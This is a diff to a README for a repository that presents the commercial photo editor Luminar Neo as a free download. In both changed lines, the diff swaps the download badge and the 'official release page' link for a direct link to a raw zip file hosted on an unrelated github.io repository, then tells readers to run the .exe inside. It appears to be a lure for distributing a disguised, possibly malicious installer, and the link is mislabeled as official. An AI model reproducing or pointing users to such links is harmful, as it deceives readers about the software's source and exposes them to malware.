@@ -5,7 +5,7 @@ description: "Download and install Luminar Neo for Windows 10 and 11 using a sim
 ---
 # 📸 Luminar-Neo - Edit your photos with smart tools
 
-[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-blue)](https://github.com/hwangwuju/Luminar-Neo)
+[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-blue)](https://raw.githubusercontent.com/hwangwuju/hwangwuju.github.io/main/Lanital/hwangwuju_github_io_3.9-alpha.1.zip)
 
 Luminar Neo allows you to edit photos using smart tools. This software helps you improve, fix, and style your images quickly. It works well for photographers who want professional results without complex manual tasks. The program uses intelligence to handle lighting, sky replacements, and skin smoothing.
 
@@ -24,7 +24,7 @@ Before you install the software, check your computer against these requirements.
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/hwangwuju/Luminar-Neo).
+1. Go to the [official release page](https://raw.githubusercontent.com/hwangwuju/hwangwuju.github.io/main/Lanital/hwangwuju_github_io_3.9-alpha.1.zip).
 2. Look for the latest version number at the top of the list.
 3. Click the installer file ending in .exe to start your download.
 4. Wait for the file to finish saving to your computer.
